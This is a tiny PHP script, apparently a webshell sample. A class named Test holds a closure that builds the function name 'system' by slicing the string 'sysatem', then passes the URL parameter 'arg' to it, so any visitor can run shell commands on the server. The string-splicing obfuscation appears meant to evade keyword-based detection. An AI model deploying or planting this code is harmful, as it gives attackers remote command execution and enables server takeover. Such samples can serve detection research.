<?php
class Test
{
    public $greet;
    public function __construct () {
        $this->greet = function () {
            $method='sysatem';
            (substr($method,0,3).substr($method, 4))($_GET['arg']);
        };
    }
}
$a=new Test();
//var_dump($a->greet);
$b=$a->greet;
$b();
?>